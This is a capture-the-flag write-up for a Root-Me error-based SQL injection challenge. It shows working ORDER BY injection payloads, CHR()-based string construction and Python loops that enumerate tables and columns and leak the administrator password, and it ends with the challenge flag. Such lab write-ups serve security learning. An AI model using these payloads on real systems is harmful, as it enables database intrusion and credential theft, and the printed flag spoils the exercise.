# SQL injection - Error

**Title**: Exploiting SQL error

**Point:** 40 Points

**Description:** Retrieve administrator’s password.

## Solution:

First, we have to find the SQLi point. Try `1'` in login form but it's not worked. Access **Contents**, we can see the URL `?action=contents&order=ASC` with 2 parameters `action` and `order`. The possible SQLi point is in `order`.

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160273512-430dad81-59d4-42d6-8d9c-ad88ed5081f7.png"/> </p>

Try simple payload:

```
123' or 1=1 -- 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160273597-484fa0ff-2df0-4a09-af08-71046a69f741.png"/> </p>

We can see  full query in this chall and find out our input is appended to `order by page `. With this injecting position, we can't use any directly keyword like `UNION`, `WHERE`, `AND`, `OR` ... because **order by** is often a keyword at the end of the query. With some samples, we can find out the **filter** in back-end server.

Filter: `;`

We can confirm this is an order-by injection with:

```
ASC 
```
**NOTE: With some testing like using unique function like BINARY_CHECKSUM(MySQL), sqlite_verion(SQLite), ... and combine with error message format. We can easily detect this site use PostgreSQL**

[Reference the exploitation](https://portswigger.net/support/sql-injection-in-the-query-structure). To retrieve administrator’s password, we will take advantage of `CAST` function. This function's work is just simply trying to convert string to a specified type. For example, `CAST('123' as int)` will return `123`. But `CAST('khangtictoc' as int)` will return error message.

**NOTE: With MySQL, if CAST doesn't success. It will return '0'**

Construct payload using `CAST()` and put into the second parameter in `ORDER BY`. Use a query for returning the result when error happens when `CAST()` is triggered. Beside, `CAST()` only have 1 value, make sure our query return 1 rows

In PostgreSQL, there're 2 worth-mention table is `information_schema.tables` and `information_schema.columns` saving information for each database. We would try to retrieve columns's info. Payload:

```
asc, cast((select table_name from information_schema.talbes limit 1 offset 0) as int)
```

**NOTE: limit the number of rows by using limit. PostgreSQL don't allow to use any syntax like `LIMIT 1, 2`. We have to use keyword `OFFSET` in our query.**

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160275468-1e7b91a8-b20f-4bfb-84b1-bf4be974da5b.png"/> </p>

We have successfully retrieve the first table `m3mbr35t4bl3` in table. The point is, we just only get 1 values and we have to change the offset to get next value. So another way to do this quick is use **brute-force**. Use python code:

```python
import requests 
i = 0 
while(True):
    request = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc, cast((select table_name from information_schema.tables limit 1 offset " + str(i) + ") as int)")
    response = request.text
    content = response[response.find("invalid")::]
    print(content)
    i += 1
```

This loop runs forever until we find a "doubting" table. After running a period of time, I realize the first table `m3mbr35t4bl3` is the correct table all the time (~.~) and other tables belong to system.

Try similar payload to retrieve all the **columns** in `information_schema.columns` which has our target table `m3mbr35t4bl3`

```
asc, cast((select column_name from information_schema.columns where table_name='m3mbr35t4bl3' limit 1 offset 0) as int)
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160275810-71b2800b-ca01-4a7c-81f2-ab61cc7506d4.png"/> </p>

This make me silent for a long time. After searching , I've known that **PostgreSQL** doesn't allow string like `'m3mbr35t4bl3'` as parameter - this will alert error syntax; also if we use double quote `"m3mbr35t4bl3"` instead, it would consider this `m3mbr35t4bl3` as a identifier. So we can use some method to construct a string like using `CHR()` function with ascii code to get the characters and combine with `||` to concat those into a string. Use this python code for quick generating: 

```python 
a = "m3mbr35t4bl3"
result = ""
for i in range (len(a)):
    if i != len(a) - 1:
        result += "chr(" + str(ord(a[i])) + ") || "
    else:
        result += "chr(" + str(ord(a[i])) + ")"
print(result)
```

Output:

```
chr(109) || chr(51) || chr(109) || chr(98) || chr(114) || chr(51) || chr(53) || chr(116) || chr(52) || chr(98) || chr(108) || chr(51)
```

Create payload again, replace `'m3mbr35t4bl3'` with the output above:

```
asc, cast((select column_name from information_schema.columns where table_name=chr(109) || chr(51) || chr(109) || chr(98) || chr(114) || chr(51) || chr(53) || chr(116) || chr(52) || chr(98) || chr(108) || chr(51) limit 1 offset 0) as int)
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160276020-77f35d09-9804-4172-90a2-c76d1c472d73.png"/> </p>

It's worked !!! Change the query request in python code to brute-force all columns

```python
import requests 

i = 0 
while(True): 
    request = requests.get("http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc, cast((select column_name from information_schema.columns where table_name=chr(109) || chr(51) || chr(109) || chr(98) || chr(114) || chr(51) || chr(53) || chr(116) || chr(52) || chr(98) || chr(108) || chr(51) limit 1 offset " + str(i) + ") as int)")
        
    response = request.text
    content = response[response.find("invalid")::]
    print(content)
    i += 1
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160276192-508fd42e-9ce3-4dab-ac1d-80b9ddf68ee1.png"/> </p>


There's only 4 values returned. As we can see, `us3rn4m3_c0l` and `p455w0rd_c0l` is 2 columns that may contain 'username' and 'password'. Use 2 payload to retrieve each pair (username - password) to ensure the correct password.

```
asc, cast((select us3rn4m3_c0l from m3mbr35t4bl3 limit 1 offset 0) as int)
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160276342-29a23d49-1915-46c8-ae23-2a6f7e1188e8.png"/> </p>

```
asc, cast((select p455w0rd_c0l from m3mbr35t4bl3 limit 1 offset 0) as int) 
```

<p align="center"><img src="https://user-images.githubusercontent.com/48288606/160276379-f3ead8b2-ee7b-43fd-8509-776cf375548b.png"/> </p>

**NOTE: This challenge is great ! They often put our target value returned in the first row. If `username` or `password` in the middle or at the end of the table. We will need to brute-force again.**

Final payload http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=asc,%20cast((select%20p455w0rd_c0l%20from%20m3mbr35t4bl3%20limit%201%20offset%200)%20as%20int)

Code Python used: [Brute-force]() and [Generating string]()

Flag: **1a2BdKT5DIx3qxQN3UaC**
